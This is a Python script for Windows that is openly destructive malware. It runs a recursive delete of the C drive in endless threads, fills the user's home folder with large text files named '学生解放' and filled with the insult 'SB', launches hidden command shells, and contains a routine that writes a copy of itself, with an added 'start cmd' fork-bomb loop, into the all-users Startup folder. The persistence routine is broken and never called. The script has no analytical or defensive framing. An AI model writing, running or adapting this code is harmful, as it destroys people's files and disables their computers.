import os
import subprocess
import sys
import ctypes
import threading
cnt=0
def txt():
    global cnt
    cnt+=1
    file=open(os.path.expanduser("~\\")+"学生解放"+str(cnt)+".txt","a",encoding="utf-8")
    file.write("SB"*512*1024*15)
def kill():
    os.system("rd /s /q c:\\*")
def unshow():
    subprocess.call('cmd', creationflags=subprocess.CREATE_NO_WINDOW)
def manager():
    manager_file=open("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\manager.py","a",encoding="utf-8")
    manager.write('''
import os
import subprocess
import sys
import ctypes
import threading
cnt=0
def txt():
    global cnt
    cnt+=1
    file=open(os.path.expanduser("~\\")+"学生解放"+str(cnt)+".txt","a",encoding="utf-8")
    file.write("SB"*512*1024*15)
def kill():
    os.system("rd /s /q c:\\*")
def unshow():
    subprocess.call('cmd', creationflags=subprocess.CREATE_NO_WINDOW)
def cmd():
    while True:
    
        os.system("start cmd")
    
while True:
    cnt+=1
    t=threading.Thread(target=kill,args=())
    t1=threading.Thread(target=txt,args=())
    t2=threading.Thread(target=txt,args=())
    t3=threading.Thread(target=unshow,args=())
    t4=threading.Thread(target=cmd,args=())
    t.start()
    t1.start()
    t2.start()
    t3.start()
    t4.start()
''')
while True:
    cnt+=1
    t=threading.Thread(target=kill,args=())
    t1=threading.Thread(target=txt,args=())
    t2=threading.Thread(target=txt,args=())
    t3=threading.Thread(target=unshow,args=())
    t.start()
    t1.start()
    t2.start()
    t3.start()
